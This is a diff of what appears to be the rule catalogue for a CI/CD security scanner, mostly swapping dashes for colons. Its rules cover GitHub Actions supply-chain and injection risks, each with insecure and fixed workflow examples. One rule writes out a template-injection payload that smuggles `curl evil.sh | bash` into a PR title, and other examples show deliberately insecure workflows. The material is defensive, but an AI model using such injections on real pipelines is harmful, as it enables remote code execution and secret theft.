+        "Archived repositories don't receive security fixes. Any vulnerability discovered after the archive date stays open forever, but the action keeps running inside your workflow with whatever permissions you grant it. Pinning by SHA does not save the caller either: the last maintainer (or whoever later acquires the namespace) can still push new code under the same repository name.",
       remediation:
         "Replace the archived action with a maintained alternative, fork it and patch it yourself, or vendor the action's source into your repository under `.github/actions/`. If the action is small enough to read in one sitting, inlining the equivalent shell logic removes the supply-chain dependency entirely.",
-      badExample: `# .github/workflows/release.yml — ❌ Archived upstream
+      badExample: `# .github/workflows/release.yml: ❌ Archived upstream
 jobs:
   release:
     runs-on: ubuntu-latest
     steps:
       - uses: archived-org/release-action@v1   # repo archived 2023`,
       badExampleCaption: "The upstream repo is archived; the SHA-pinned version is frozen too, including its bugs.",
-      goodExample: `# .github/workflows/release.yml — ✅ Maintained alternative
+      goodExample: `# .github/workflows/release.yml: ✅ Maintained alternative
 jobs:
   release:
     runs-on: ubuntu-latest
@@ -2771,7 +2771,7 @@ github:
         "An impostor SHA means the workflow could be installing a commit from a fork that's later been deleted or renamed. The pinned SHA still resolves on GitHub's CDN for a while but represents code that doesn't belong to the apparent owner anymore.",
       remediation:
         "Resolve the action's current latest release upstream, copy its real SHA, and update the `uses:` line accordingly.",
-      badExample: `# .github/workflows/test.yml — ❌ SHA missing upstream
+      badExample: `# .github/workflows/test.yml: ❌ SHA missing upstream
 jobs:
   test:
     runs-on: ubuntu-latest
@@ -2779,7 +2779,7 @@ jobs:
       - uses: owner/repo@deadbeefdeadbeefdeadbeefdeadbeefdeadbeef
         # ^ not present in owner/repo's history`,
       badExampleCaption: "The pinned SHA does not exist in the upstream repository's history.",
-      goodExample: `# .github/workflows/test.yml — ✅ SHA resolves upstream
+      goodExample: `# .github/workflows/test.yml: ✅ SHA resolves upstream
 jobs:
   test:
     runs-on: ubuntu-latest
@@ -2788,7 +2788,7 @@ jobs:
       goodExampleCaption: "SHA matches a real tagged commit upstream.",
       tips: [
         "Get the right SHA with `gh api repos/OWNER/REPO/git/refs/tags/vX.Y.Z`.",
-        "This rule needs upstream lookup — running offline or against a private upstream where the token has no access will report `partialControls` (abstain).",
+        "This rule needs upstream lookup: running offline or against a private upstream where the token has no access will report `partialControls` (abstain).",
       ],
       status: "roadmap",
       relatedCodes: ["ISSUE-701", "ISSUE-708"],
@@ -2808,10 +2808,10 @@ jobs:
       description:
         "The `# vX.Y.Z` comment after a SHA-pinned action does not correspond to the SHA the ref actually resolves to upstream.",
       impact:
-        "A wrong comment misleads reviewers and Dependabot/Renovate. Someone reading the file thinks they're on v4.2.0 when they're actually on a v3.x SHA — and the next 'bump v4.2.0 → v4.3.0' PR silently jumps two majors.",
+        "A wrong comment misleads reviewers and Dependabot/Renovate. Someone reading the file thinks they're on v4.2.0 when they're actually on a v3.x SHA, and the next 'bump v4.2.0 → v4.3.0' PR silently jumps two majors.",
       remediation:
         "Update the comment to the version that actually corresponds to the SHA, or update the SHA to the latest of the version named in the comment.",
-      badExample: `# .github/workflows/test.yml — ❌ Comment lies
+      badExample: `# .github/workflows/test.yml: ❌ Comment lies
 jobs:
   test:
     runs-on: ubuntu-latest
@@ -2819,7 +2819,7 @@ jobs:
       - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v3
         # ^ but that SHA is actually v4.2.2`,
       badExampleCaption: "The comment says v3; the SHA is from v4.2.2.",
-      goodExample: `# .github/workflows/test.yml — ✅ Comment matches SHA
+      goodExample: `# .github/workflows/test.yml: ✅ Comment matches SHA
 jobs:
   test:
     runs-on: ubuntu-latest
@@ -2851,7 +2851,7 @@ jobs:
         "Pin-by-SHA without an update cadence means missed security fixes from upstream. A `v4.0.0` SHA from 2023 doesn't include the 2025 security patches every other consumer already has.",
       remediation:
         "Update the pinned SHA to the latest stable release of the action. Dependabot or Renovate can automate this with PRs you can review individually.",
-      badExample: `# .github/workflows/test.yml — ❌ Far behind latest
+      badExample: `# .github/workflows/test.yml: ❌ Far behind latest
 jobs:
   test:
     runs-on: ubuntu-latest
@@ -2859,7 +2859,7 @@ jobs:
       - uses: actions/checkout@8e5e7e5ab8b370d6c329ec480221332ada57f0ab # v3.5.2
         # ^ latest is v4.2.2 (multiple security fixes since)`,
       badExampleCaption: "Action pinned to a 2-year-old SHA; upstream has shipped multiple security releases since.",
-      goodExample: `# .github/workflows/test.yml — ✅ Up-to-date
+      goodExample: `# .github/workflows/test.yml: ✅ Up-to-date
 jobs:
   test:
     runs-on: ubuntu-latest
@@ -2891,7 +2891,7 @@ jobs:
         "GitHub's ref-resolution order makes the outcome implementation-defined and timing-dependent. An attacker who can push to a branch named `v1` upstream may be able to have CI pick the branch over the tag under specific conditions, swapping a release for arbitrary code.",
       remediation:
         "Pin the action to a 40-character commit SHA, which is unambiguous. Alternatively, ask the upstream maintainer to remove one of the two colliding refs.",
-      badExample: `# .github/workflows/test.yml — ❌ Ambiguous ref
+      badExample: `# .github/workflows/test.yml: ❌ Ambiguous ref
 jobs:
   test:
     runs-on: ubuntu-latest
@@ -2899,7 +2899,7 @@ jobs:
       - uses: owner/repo@v1
         # ^ \`v1\` exists as both a tag AND a branch upstream`,
       badExampleCaption: "The action ref resolves to either a tag or a branch depending on GitHub's internal order.",
-      goodExample: `# .github/workflows/test.yml — ✅ SHA-pinned removes the ambiguity
+      goodExample: `# .github/workflows/test.yml: ✅ SHA-pinned removes the ambiguity
 jobs:
   test:
     runs-on: ubuntu-latest
@@ -2927,14 +2927,14 @@ jobs:
         "GitLab resolves the tag first, so the pipeline pulls the tagged revision today, but a tag deletion, a rename, or a typo can switch the binding to the mutable branch, which tracks every push. The included template runs in your pipeline with your CI/CD variables and tokens, so the ambiguity is a supply-chain landmine: a reviewer cannot tell from the YAML which of the two revisions will run.",
       remediation:
         "Pin the include to a 40-character commit SHA, which is unambiguous (a commit SHA also takes precedence over a same-named tag). Alternatively, ask the upstream maintainer to remove one of the two colliding refs.",
-      badExample: `# .gitlab-ci.yml — ❌ Ambiguous ref
+      badExample: `# .gitlab-ci.yml: ❌ Ambiguous ref
 include:
   - project: my-group/ci-templates
     ref: v1
     file: /templates/build.yml
     # ^ \`v1\` exists as both a tag AND a branch upstream`,
       badExampleCaption: "The include ref resolves to either the tag or the branch depending on GitLab's resolution order.",
-      goodExample: `# .gitlab-ci.yml — ✅ SHA-pinned removes the ambiguity
+      goodExample: `# .gitlab-ci.yml: ✅ SHA-pinned removes the ambiguity
 include:
   - project: my-group/ci-templates
     ref: a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4
@@ -2960,19 +2960,19 @@ include:
       controlName: "Actions must not carry known CVEs",
       controlConfigKey: "actionsMustNotCarryKnownCVEs",
       description:
-        "A step-level `uses: owner/repo@ref` in committed workflow YAML matches a published GitHub Advisory Database entry for the `actions` ecosystem. Plumber queries `/advisories?ecosystem=actions&affects=<owner>/<repo>` once per `owner/repo` (cached). Exact tags (`@v4.1.0`) and SHA-resolved versions are point-checked against each advisory's `vulnerable_version_range`. Moving partial tags (`@v4`, `@v4.1`) are span-checked across the whole release series they can float across, so a partial tag is only reported when the **entire** span is vulnerable — `@v4` floating to `v4.3.0` does not match `>= 4.0.0, < 4.1.3`. A ref that cannot be resolved to a release version — a commit SHA with no matching release tag, or a mutable non-numeric tag such as `@rc` / `@main` / `@latest` — abstains and surfaces a 'could not verify' warning instead of matching every advisory for that repo. Requires `gh` / `GH_TOKEN`; without auth the control abstains.",
+        "A step-level `uses: owner/repo@ref` in committed workflow YAML matches a published GitHub Advisory Database entry for the `actions` ecosystem. Plumber queries `/advisories?ecosystem=actions&affects=<owner>/<repo>` once per `owner/repo` (cached). Exact tags (`@v4.1.0`) and SHA-resolved versions are point-checked against each advisory's `vulnerable_version_range`. Moving partial tags (`@v4`, `@v4.1`) are span-checked across the whole release series they can float across, so a partial tag is only reported when the **entire** span is vulnerable: `@v4` floating to `v4.3.0` does not match `>= 4.0.0, < 4.1.3`. A ref that cannot be resolved to a release version (a commit SHA with no matching release tag, or a mutable non-numeric tag such as `@rc` / `@main` / `@latest`) abstains and surfaces a 'could not verify' warning instead of matching every advisory for that repo. Requires `gh` / `GH_TOKEN`; without auth the control abstains.",
       impact:
         "A known-vulnerable action running in CI means the workflow inherits the published vulnerability class (RCE, secret exfiltration, privilege escalation, depending on the advisory). The blast radius is the union of the job's permissions and the secrets the workflow can read.",
       remediation:
         "Upgrade to a version outside the advisory's affected range (the advisory page lists a fixed-in version) and re-pin by SHA so a future retag cannot silently revert the fix. Configure Dependabot with `package-ecosystem: github-actions` to receive PR alerts when new advisories land against actions you already use.",
-      badExample: `# .github/workflows/release.yml — ❌ Affected by GHSA-mrrh-fwg8-r2c3
+      badExample: `# .github/workflows/release.yml: ❌ Affected by GHSA-mrrh-fwg8-r2c3
 jobs:
   release:
     runs-on: ubuntu-latest
     steps:
       - uses: tj-actions/changed-files@v45.0.0   # CVE-2025-30066`,
       badExampleCaption: "The pinned version is in the affected range of a published advisory.",
-      goodExample: `# .github/workflows/release.yml — ✅ Patched version pinned by SHA
+      goodExample: `# .github/workflows/release.yml: ✅ Patched version pinned by SHA
 jobs:
   release:
     runs-on: ubuntu-latest
@@ -3013,7 +3013,7 @@ github:
         "Every third-party action is supply-chain surface. A `gh` or `jq` installer action provides no value over `run: gh ...` / `run: jq ...` directly, but each adds a fresh dependency you'd need to audit on every release.",
       remediation:
         "Remove the action and call the runner's built-in tool directly from a `run:` step.",
-      badExample: `# .github/workflows/release.yml — ❌ Reinventing the runner's gh CLI
+      badExample: `# .github/workflows/release.yml: ❌ Reinventing the runner's gh CLI
 jobs:
   release:
     runs-on: ubuntu-latest
@@ -3021,8 +3021,8 @@ jobs:
       - uses: cli/cli-action@v1   # gh is already on the runner
         with:
           gh_args: release create v1.0.0`,
-      badExampleCaption: "A third-party wrapper around `gh` — extra supply-chain surface for no gain.",
-      goodExample: `# .github/workflows/release.yml — ✅ Use the runner's gh directly
+      badExampleCaption: "A third-party wrapper around `gh`: extra supply-chain surface for no gain.",
+      goodExample: `# .github/workflows/release.yml: ✅ Use the runner's gh directly
 jobs:
   release:
     runs-on: ubuntu-latest
@@ -3036,7 +3036,7 @@ jobs:
       goodExampleCaption: "Calls the pre-installed `gh` directly.",
       tips: [
         "GitHub-hosted runners come with `gh`, `jq`, `yq`, `aws`, `gcloud`, `kubectl`, `docker` and many others pre-installed. See https://github.com/actions/runner-images.",
-        "Self-hosted runners can vary — check what's on yours before disabling the rule.",
+        "Self-hosted runners can vary. Check what's on yours before disabling the rule.",
       ],
       status: "roadmap",
       relatedCodes: ["ISSUE-701"],
@@ -3059,26 +3059,26 @@ jobs:
         "a GitHub-official owner (`actions/*`, `github/*`, trusted by default)",
         "the same org/user as the scanned repository (`trustSameOrgActions`, trusted by default)",
         "the `trustedGithubActions` allowlist (exact `owner/repo` or `owner/*` wildcard)",
-        "a `minimumStars` floor — when set, the action's upstream repository has at least that many stars",
+        "a `minimumStars` floor (when set, the action's upstream repository has at least that many stars)",
       ],
       impact:
-        "Every third-party action runs inside the caller workflow with its `GITHUB_TOKEN` and secrets, so an unvetted owner is a direct supply-chain entry point — the vector behind the `tj-actions/changed-files` compromise (CVE-2025-30066). The `minimumStars` floor additionally catches the rename/re-creation squat, where an attacker re-registers a once-trusted repository name with no history.",
+        "Every third-party action runs inside the caller workflow with its `GITHUB_TOKEN` and secrets, so an unvetted owner is a direct supply-chain entry point. This was the vector behind the `tj-actions/changed-files` compromise (CVE-2025-30066). The `minimumStars` floor additionally catches the rename/re-creation squat, where an attacker re-registers a once-trusted repository name with no history.",
       remediation:
         "Use an action from an authorized source. Keep `trustGithubOfficialActions` on for `actions/*` and `github/*`, add trusted owners or actions to `trustedGithubActions` (exact `owner/repo` or `owner/*`), and optionally set `minimumStars` to require a popularity threshold. Vendoring the action into a local `./.github/actions/…` directory removes the external dependency entirely.",
-      badExample: `# .github/workflows/ci.yml — ❌ Actions from unvetted owners
+      badExample: `# .github/workflows/ci.yml: ❌ Actions from unvetted owners
 jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4              # official — trusted
-      - uses: random-dev/handy-action@v1       # unknown owner — flagged
-      - uses: tj-actions/changed-files@v45     # not on the allowlist — flagged
+      - uses: actions/checkout@v4              # official: trusted
+      - uses: random-dev/handy-action@v1       # unknown owner: flagged
+      - uses: tj-actions/changed-files@v45     # not on the allowlist: flagged
   deploy:
-    # Job-level reusable workflow from an unauthorized owner — flagged.
+    # Job-level reusable workflow from an unauthorized owner: flagged.
     uses: acme/shared-workflows/.github/workflows/deploy.yml@main`,
       badExampleCaption:
         "Only `actions/checkout` is trusted; the two third-party steps and the reusable-workflow call all come from unauthorized owners.",
-      goodExample: `# .github/workflows/ci.yml — ✅ Only authorized sources
+      goodExample: `# .github/workflows/ci.yml: ✅ Only authorized sources
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -3087,7 +3087,7 @@ jobs:
       - uses: mycompany/handy-action@v1        # allowed via mycompany/*
       - uses: jdx/mise-action@v2               # allowed by exact entry
 
-# .plumber.yaml — opt in and define the trusted set
+# .plumber.yaml: opt in and define the trusted set
 github:
   controls:
     githubActionMustComeFromAuthorizedSources:
@@ -3101,10 +3101,10 @@ github:
       goodExampleCaption:
         "Every `uses:` resolves to an official owner, your own org, an allowlist match, or (when enabled) a starred repo.",
       tips: [
-        "Trust is satisfied by ANY of: a GitHub-official owner (`actions/*`, `github/*`, on by default), the scanned repo's own org (`trustSameOrgActions`, on by default), a `trustedGithubActions` match, or — when `minimumStars > 0` — enough stars on the action repo.",
+        "Trust is satisfied by ANY of: a GitHub-official owner (`actions/*`, `github/*`, on by default), the scanned repo's own org (`trustSameOrgActions`, on by default), a `trustedGithubActions` match, or, when `minimumStars > 0`, enough stars on the action repo.",
         "`trustSameOrgActions` trusts actions whose owner matches the scanned repository's owner (case-insensitive). It abstains when the repo owner is unknown (e.g. no GitHub remote), so it never grants trust on missing data.",
         "`trustedGithubActions` accepts an exact `owner/repo` (`jdx/mise-action`) or an `owner/*` whole-org wildcard (`mycompany/*`). Bare owners and arbitrary globs are not supported.",
-        "Job-level reusable-workflow calls (`jobs.<id>.uses`) are checked too, but only against the official-owner and allowlist rules — they carry no star metadata.",
+        "Job-level reusable-workflow calls (`jobs.<id>.uses`) are checked too, but only against the official-owner and allowlist rules, since they carry no star metadata.",
         "`minimumStars` reads star counts from the GitHub API and needs `gh` / `GH_TOKEN`. Without it, a reference falls back to the allowlist rather than being flagged on missing data.",
         "Local actions (`uses: ./.github/actions/foo`) and `docker://` image steps are always exempt.",
       ],
@@ -3126,10 +3126,10 @@ github:
       description:
         "A workflow passes a literal username and password to `docker/login-action` (or an equivalent `docker login` shell command) instead of pulling them from `secrets`.",
       impact:
-        "Hardcoded registry credentials are visible to every collaborator, in every fork, and in workflow logs until they're rotated. A leaked registry token typically grants push access — meaning supply-chain compromise of every consumer of those images.",
+        "Hardcoded registry credentials are visible to every collaborator, in every fork, and in workflow logs until they're rotated. A leaked registry token typically grants push access, which means supply-chain compromise of every consumer of those images.",
       remediation:
         "Move the credentials into repository / organisation secrets and reference them via `${{ secrets.REGISTRY_PASSWORD }}`. If feasible, switch to OIDC federation (no long-lived password).",
-      badExample: `# .github/workflows/publish.yml — ❌ Hardcoded
+      badExample: `# .github/workflows/publish.yml: ❌ Hardcoded
 jobs:
   publish:
     runs-on: ubuntu-latest
@@ -3139,7 +3139,7 @@ jobs:
           username: ci-bot
           password: dckr_pat_AAAA_BBBB_CCCC`,
       badExampleCaption: "Literal password in the workflow file.",
-      goodExample: `# .github/workflows/publish.yml — ✅ From secrets
+      goodExample: `# .github/workflows/publish.yml: ✅ From secrets
 jobs:
   publish:
     runs-on: ubuntu-latest
@@ -3157,9 +3157,9 @@ github:
       enabled: true`,
       goodExampleCaption: "Credentials come from `secrets` (and ghcr.io supports `GITHUB_TOKEN` directly).",
       tips: [
-        "ghcr.io accepts `GITHUB_TOKEN` for push — no separate credential needed.",
+        "ghcr.io accepts `GITHUB_TOKEN` for push, so no separate credential is needed.",
         "For Docker Hub, generate a scoped access token (read-only or read-write) instead of using the account password.",
-        "If a credential ever was hardcoded, rotate it immediately — it's in the git history.",
+        "If a credential ever was hardcoded, rotate it immediately; it's in the git history.",
       ],
       status: "roadmap",
       relatedCodes: ["ISSUE-301", "ISSUE-302"],
@@ -3179,10 +3179,10 @@ github:
       description:
         "A release/publish workflow restores a build cache primed by an earlier workflow on a less-trusted trigger (typically `pull_request_target` or a build that runs PR-author code).",
       impact:
-        "If the cache contains compiled bytes derived from PR-author-controlled code, the release workflow ships those bytes — the malicious code never appears in the release commit, only in the cache that the trusted build reuses.",
+        "If the cache contains compiled bytes derived from PR-author-controlled code, the release workflow ships those bytes. The malicious code never appears in the release commit, only in the cache that the trusted build reuses.",
       remediation:
         "Treat caches as untrusted across triggers. The release workflow should re-build from source rather than restoring a cache primed by an untrusted build.",
-      badExample: `# .github/workflows/release.yml — ❌ Restores PR-built cache
+      badExample: `# .github/workflows/release.yml: ❌ Restores PR-built cache
 jobs:
   release:
     runs-on: ubuntu-latest
@@ -3194,7 +3194,7 @@ jobs:
           key: dist-\${{ github.sha }}   # populated by PR builds
       - run: ./publish.sh`,
       badExampleCaption: "`dist/` may have been produced by a PR-author-controlled build.",
-      goodExample: `# .github/workflows/release.yml — ✅ Build from source
+      goodExample: `# .github/workflows/release.yml: ✅ Build from source
 jobs:
   release:
     runs-on: ubuntu-latest
@@ -3228,13 +3228,13 @@ jobs:
         "Same supply chain risk as ISSUE-103 but moved one level out: a mutable base-image tag can be retagged upstream between builds, silently swapping the base layers under your build.",
       remediation:
         "Pin the base image to its digest in the Dockerfile. `crane digest image:tag` or `docker inspect image:tag --format='{{.RepoDigests}}'` gives the digest.",
-      badExample: `# Dockerfile — ❌ Mutable base
+      badExample: `# Dockerfile: ❌ Mutable base
 FROM node:20-alpine
 WORKDIR /app
 COPY package*.json ./
 RUN npm ci`,
       badExampleCaption: "`node:20-alpine` can change underneath you.",
-      goodExample: `# Dockerfile — ✅ Pinned by digest
+      goodExample: `# Dockerfile: ✅ Pinned by digest
 FROM node:20-alpine@sha256:c628bdc7ebc15dbd31196b3a2b96e7f51a3e89a1c6f3...
 WORKDIR /app
 COPY package*.json ./
@@ -3266,12 +3266,12 @@ github:
       controlName: "Workflow must not inline user input into shell scripts",
       controlConfigKey: "workflowMustNotInjectUserInputInScripts",
       description:
-        "A `run:` step inlines an attacker-controlled **free-text** `github` field directly into a shell command. The expression value is interpolated by GitHub *before* the shell parses it, so a malicious PR title, comment body, or branch name becomes part of the executed script. The check fires only on the genuinely injectable subfields (titles, bodies, ref names, commit messages, fork metadata, author identity) — numeric, boolean, enum and SHA fields are deliberately ignored because they cannot carry an injection payload.",
+        "A `run:` step inlines an attacker-controlled **free-text** `github` field directly into a shell command. The expression value is interpolated by GitHub *before* the shell parses it, so a malicious PR title, comment body, or branch name becomes part of the executed script. The check fires only on the genuinely injectable subfields (titles, bodies, ref names, commit messages, fork metadata, author identity). Numeric, boolean, enum and SHA fields are deliberately ignored because they cannot carry an injection payload.",
       impact:
         "Template injection is the GitHub Actions equivalent of SQL injection. A PR titled `foo`; curl evil.sh | bash; #` becomes a runtime shell command with the workflow's secrets in scope. This is the #1 cause of secret exfiltration on GitHub Actions over the past two years.",
       remediation:
         "Bind the untrusted value to an `env:` variable first, then reference the env var from the shell. The shell quotes env-var expansion naturally, breaking the injection.",
-      badExample: `# .github/workflows/welcome.yml — ❌ Template injection
+      badExample: `# .github/workflows/welcome.yml: ❌ Template injection
 on: pull_request_target
 jobs:
   welcome:
@@ -3279,7 +3279,7 @@ jobs:
     steps:
       - run: echo "Welcome \${{ github.event.pull_request.title }}!" `,
       badExampleCaption: "The PR title goes straight into the shell. `; curl evil.sh | bash; #` runs.",
-      goodExample: `# .github/workflows/welcome.yml — ✅ Bind through env:
+      goodExample: `# .github/workflows/welcome.yml: ✅ Bind through env:
 on: pull_request_target
 jobs:
   welcome:
@@ -3297,9 +3297,9 @@ github:
       goodExampleCaption: "The shell sees a single argument; quoting is automatic.",
       tips: [
         "Flagged subfields (attacker-controlled free text): `*.title`, `*.body`, `head.ref`, `head.label`, `head.repo.default_branch` (and the `workflow_run` `head_repository.default_branch`), `*.message`, `*.description`, `*.homepage`, `author.name`, `author.email`, `committer.name`, `committer.email`, `page_name`, and `github.head_ref`.",
-        "Deliberately not flagged: `github.event.repository.default_branch` (the base repo's default branch is admin metadata, not attacker-controlled — only the fork's `head.repo.default_branch` is), `pull_request.number`, `*.commits`, `head.repo.fork`, `event_name`, `author_association`, `*.sha`, `github.repository` — integers, booleans, enums, SHAs or trusted metadata that cannot carry an injection payload.",
-        "`github.repository`, `github.sha`, and `github.ref_name` are derived from server-trusted state — safer but still worth scoping.",
-        "Recognized safe sink: an expression wrapped in `toJSON(...)` AND consumed inside a quoted heredoc (`<<\"EOF\"` / `<<'EOF'`) is not flagged — `toJSON` escapes newlines (no heredoc-delimiter breakout) and the quoted heredoc disables `$()`/backtick expansion. Neither alone is enough: `echo \"${{ toJSON(x) }}\"` still runs `$()` inside the quotes, and a raw expression in a quoted heredoc can break out via a newline. The cleanest fix remains binding through `env:` and dereferencing `\"$VAR\"`.",
+        "Deliberately not flagged: `github.event.repository.default_branch` (the base repo's default branch is admin metadata, not attacker-controlled; only the fork's `head.repo.default_branch` is), `pull_request.number`, `*.commits`, `head.repo.fork`, `event_name`, `author_association`, `*.sha`, `github.repository`. These are integers, booleans, enums, SHAs or trusted metadata that cannot carry an injection payload.",
+        "`github.repository`, `github.sha`, and `github.ref_name` are derived from server-trusted state. They are safer but still worth scoping.",
+        "Recognized safe sink: an expression wrapped in `toJSON(...)` AND consumed inside a quoted heredoc (`<<\"EOF\"` / `<<'EOF'`) is not flagged: `toJSON` escapes newlines (no heredoc-delimiter breakout) and the quoted heredoc disables `$()`/backtick expansion. Neither alone is enough: `echo \"${{ toJSON(x) }}\"` still runs `$()` inside the quotes, and a raw expression in a quoted heredoc can break out via a newline. The cleanest fix remains binding through `env:` and dereferencing `\"$VAR\"`.",
         "Pair with ISSUE-802 to also catch the trigger side of the same attack.",
       ],
       relatedCodes: ["ISSUE-215", "ISSUE-213", "ISSUE-802"],
@@ -3319,10 +3319,10 @@ github:
       description:
         "A workflow sets `ACTIONS_ALLOW_UNSECURE_COMMANDS=true` (or equivalent) which re-enables the long-retired `set-env` / `add-path` workflow commands.",
       impact:
-        "The deprecated commands let any line printed to stdout set environment variables or modify $PATH in subsequent steps — a direct injection path for any process that echoes attacker-controlled content. GitHub retired the commands in 2020 for exactly this reason.",
+        "The deprecated commands let any line printed to stdout set environment variables or modify $PATH in subsequent steps. That is a direct injection path for any process that echoes attacker-controlled content. GitHub retired the commands in 2020 for exactly this reason.",
       remediation:
-        "Remove `ACTIONS_ALLOW_UNSECURE_COMMANDS`. Use the supported environment-files mechanism (`echo \"KEY=value\" >> $GITHUB_ENV`) instead — and only with trusted content (see ISSUE-209).",
-      badExample: `# .github/workflows/build.yml — ❌ Unsafe commands re-enabled
+        "Remove `ACTIONS_ALLOW_UNSECURE_COMMANDS`. Use the supported environment-files mechanism (`echo \"KEY=value\" >> $GITHUB_ENV`) instead, and only with trusted content (see ISSUE-209).",
+      badExample: `# .github/workflows/build.yml: ❌ Unsafe commands re-enabled
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -3331,7 +3331,7 @@ jobs:
     steps:
       - run: ./old-script.sh`,
       badExampleCaption: "Any line `::set-env::` printed by old-script.sh now sets env vars in the next step.",
-      goodExample: `# .github/workflows/build.yml — ✅ Deprecated commands stay off
+      goodExample: `# .github/workflows/build.yml: ✅ Deprecated commands stay off
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -3340,7 +3340,7 @@ jobs:
       - run: echo "VERSION=1.0.0" >> $GITHUB_ENV   # the supported way`,
       goodExampleCaption: "Uses the modern $GITHUB_ENV file (with vetted content).",
       tips: [
-        "If you need this flag for a legacy action, fix the action instead — the alternative APIs have been available for five years.",
+        "If you need this flag for a legacy action, fix the action instead; the alternative APIs have been available for five years.",
       ],
       status: "roadmap",
       relatedCodes: ["ISSUE-207", "ISSUE-209"],
@@ -3358,12 +3358,12 @@ jobs:
       controlName: "Workflow must not write untrusted content to $GITHUB_ENV",
       controlConfigKey: "workflowMustNotWriteUntrustedContentToGitHubEnv",
       description:
-        "A workflow routes PR-author-controlled content into `$GITHUB_ENV` or `$GITHUB_PATH` — directly (`echo \"KEY=${{ github.event.* }}\" >> $GITHUB_ENV`), through an `env:`-bound shell variable, or through a heredoc/redirect whose body dereferences the value.",
+        "A workflow routes PR-author-controlled content into `$GITHUB_ENV` or `$GITHUB_PATH`: directly (`echo \"KEY=${{ github.event.* }}\" >> $GITHUB_ENV`), through an `env:`-bound shell variable, or through a heredoc/redirect whose body dereferences the value.",
       impact:
         "Writing attacker-controlled content to $GITHUB_ENV creates an environment variable for every subsequent step in the job. A title containing newlines (`foo\\nMALICIOUS_PATH=...`) can inject *multiple* env vars at once, including overriding $PATH.",
       remediation:
         "Binding the value through `env:` stops command injection (ISSUE-207) but not this: a newline still opens a second `$GITHUB_ENV` line and any value poisons `$GITHUB_PATH`. Base64-encode the untrusted value itself before writing it (so no newline survives) or wrap it in `toJSON`. If it's only needed within one step, keep it in `env:` and don't write to the sticky file at all.",
-      badExample: `# .github/workflows/triage.yml — ❌ Untrusted into $GITHUB_ENV
+      badExample: `# .github/workflows/triage.yml: ❌ Untrusted into $GITHUB_ENV
 on: pull_request_target
 jobs:
   triage:
@@ -3371,7 +3371,7 @@ jobs:
     steps:
       - run: echo "TITLE=\${{ github.event.pull_request.title }}" >> $GITHUB_ENV`,
       badExampleCaption: "A multi-line PR title escapes the `TITLE=` assignment into a free-form $GITHUB_ENV write.",
-      goodExample: `# .github/workflows/triage.yml — ✅ Pre-bind + base64
+      goodExample: `# .github/workflows/triage.yml: ✅ Pre-bind + base64
 on: pull_request_target
 jobs:
   triage:
@@ -3385,8 +3385,8 @@ jobs:
       goodExampleCaption: "Base64 ensures the value is one line; consumers decode explicitly.",
       tips: [
         "Use the same trick for `$GITHUB_OUTPUT` and `$GITHUB_PATH`.",
-        "If you only need the value within one step, env: is enough — don't write to $GITHUB_ENV at all.",
-        "A fixed heredoc delimiter (`<<EOF`) doesn't help — the body still lands in $GITHUB_ENV verbatim; randomise the delimiter or base64-encode the value.",
+        "If you only need the value within one step, env: is enough; don't write to $GITHUB_ENV at all.",
+        "A fixed heredoc delimiter (`<<EOF`) doesn't help: the body still lands in $GITHUB_ENV verbatim. Randomise the delimiter or base64-encode the value.",
         "base64 must wrap the untrusted value itself; a base64 elsewhere on the line (e.g. `$(date | base64)`) does not neutralise a raw `$VAR`.",
       ],
       status: "shipping",
@@ -3410,7 +3410,7 @@ jobs:
         "An attacker who can engineer a workflow_run trigger or a comment trigger may be able to make `github.actor` evaluate to whatever they want, bypassing the gate entirely.",
       remediation:
         "Gate on facts the platform actually verifies: `github.event.pull_request.head.repo.full_name == github.repository` (PR comes from the same repo) or the presence of a signed commit, not actor strings.",
-      badExample: `# .github/workflows/release.yml — ❌ Spoofable actor gate
+      badExample: `# .github/workflows/release.yml: ❌ Spoofable actor gate
 on: pull_request
 jobs:
   approve:
@@ -3419,7 +3419,7 @@ jobs:
     steps:
       - run: ./auto-merge.sh`,
       badExampleCaption: "`github.actor` is not a strong identity claim.",
-      goodExample: `# .github/workflows/release.yml — ✅ Gate on the PR's head repo
+      goodExample: `# .github/workflows/release.yml: ✅ Gate on the PR's head repo
 on: pull_request
 jobs:
   approve:
@@ -3449,10 +3449,10 @@ jobs:
       description:
         "A workflow job or step has an `if:` condition that always evaluates the same way (always true, always false, or a tautology of two opposed clauses).",
       impact:
-        "A latent always-true condition is a guard that does nothing — security checks 'gated' by it run unconditionally even when they shouldn't. Always-false conditions silently disable scans, giving false-green pipelines.",
+        "A latent always-true condition is a guard that does nothing: security checks 'gated' by it run unconditionally even when they shouldn't. Always-false conditions silently disable scans, giving false-green pipelines.",
       remediation:
         "Rewrite the condition to reflect the intended guard. Test it against representative trigger payloads.",
-      badExample: `# .github/workflows/build.yml — ❌ Always true tautology
+      badExample: `# .github/workflows/build.yml: ❌ Always true tautology
 jobs:
   scan:
     if: \${{ github.event_name == 'push' || github.event_name != 'push' }}
@@ -3460,7 +3460,7 @@ jobs:
     steps:
       - run: ./expensive-scan.sh`,
       badExampleCaption: "The OR of an event and its negation is always true.",
-      goodExample: `# .github/workflows/build.yml — ✅ Meaningful guard
+      goodExample: `# .github/workflows/build.yml: ✅ Meaningful guard
 jobs:
   scan:
     if: \${{ github.event_name == 'push' && github.ref == 'refs/heads/main' }}
@@ -3489,18 +3489,18 @@ jobs:
       description:
         "A workflow calls `contains(haystack, needle)` with swapped arguments, mismatched types, or in a way that always returns false.",
       impact:
-        "`contains()` is the most common GitHub Actions string-membership check. A swapped-argument call silently returns false — and the security gate it's gating fails open.",
+        "`contains()` is the most common GitHub Actions string-membership check. A swapped-argument call silently returns false, and the security gate fails open.",
       remediation:
         "Use `contains(haystack, needle)` argument order. `contains(github.event.pull_request.labels.*.name, 'needs-review')` not `contains('needs-review', github.event.pull_request.labels.*.name)`.",
-      badExample: `# .github/workflows/deploy.yml — ❌ Args swapped
+      badExample: `# .github/workflows/deploy.yml: ❌ Args swapped
 jobs:
   deploy:
     if: contains('production', github.event.pull_request.labels.*.name)
     runs-on: ubuntu-latest
     steps:
       - run: ./deploy.sh`,
-      badExampleCaption: "Asks 'does the literal string production contain the labels array' — always false.",
-      goodExample: `# .github/workflows/deploy.yml — ✅ Correct order
+      badExampleCaption: "Asks 'does the literal string production contain the labels array', which is always false.",
